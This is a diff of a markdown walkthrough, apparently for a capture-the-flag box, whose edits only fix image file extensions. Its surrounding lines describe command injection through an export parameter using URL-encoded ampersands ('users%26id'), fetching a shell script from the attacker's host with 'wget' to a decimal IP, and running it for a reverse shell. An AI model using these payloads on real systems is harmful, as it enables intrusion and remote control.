@@ -40,7 +40,7 @@ In order for gobuster to be intercepted we will need to route our requests throu
 
 Then switch to the ‘Request handling’ tab and set it to redirect to our target IP address and port number and click ‘OK’.
 
-![img](assets/burp_request_handling)
+![img](assets/burp_request_handling.png)
 
 Now simply run gobuster again only this time using the IP and port of the new listener, this allows us to see the request gobuster is sending to the target by passing it through burp suite, ignore the error as it’s due to burp suite intercepting only one request at a time.
 
@@ -205,7 +205,7 @@ Let’s try adding ``%3Bwhoami`` to the get request, the ‘%3B’ is URL encodi
 
 It appears there are some filtering rules that allow only specific characters to be passed into the ‘export’ file. Interestingly, the ampersand symbol (&) is allowed. Consulting online sources such as https://www.tecmint.com/chaining-operators-in-linux-with-practical-examples/ will inform us that the ampersand symbol is a Linux command operator and we know already that the target is running Linux. The ampersand tells the Linux OS to execute that command in the background, we can also use it to execute multiple simultaneous commands in the background. This is how we will carry out the command injection.
 
-![img](assets/request_id)
+![img](assets/request_id.png)
 
 We modify the request in burp to replace ‘bookings’ with ‘users%26id’, ‘%26’ is the URL encoding for the ampersand symbol. The file that is sent to us for download will now contain the user table entries as-well as the output from our ‘id’ command.
 
@@ -225,7 +225,7 @@ We can host this using python the same way we hosted our javascript file. The ta
 
 In the screenshot of Burp Suite above, we have added ``%26wget%20168431165/shell`` to the end of the table field in our get request, with ‘%20’  being a space and the ‘168431165’ being the decimal representation of our IP. We can verify it has been downloaded by checking the python server logs.
 
-![img](assets/python_server_get)
+![img](assets/python_server_get.png)
 
 Now it’s a case of running a listener on the port we specified in the bash script, then just like before we can use burpsuite to modify the request however this time we add ``%26bash%20shell`` to our table field in order to run the bash script we just downloaded. If everything was successful we now have a reverse shell connection to the target.
 
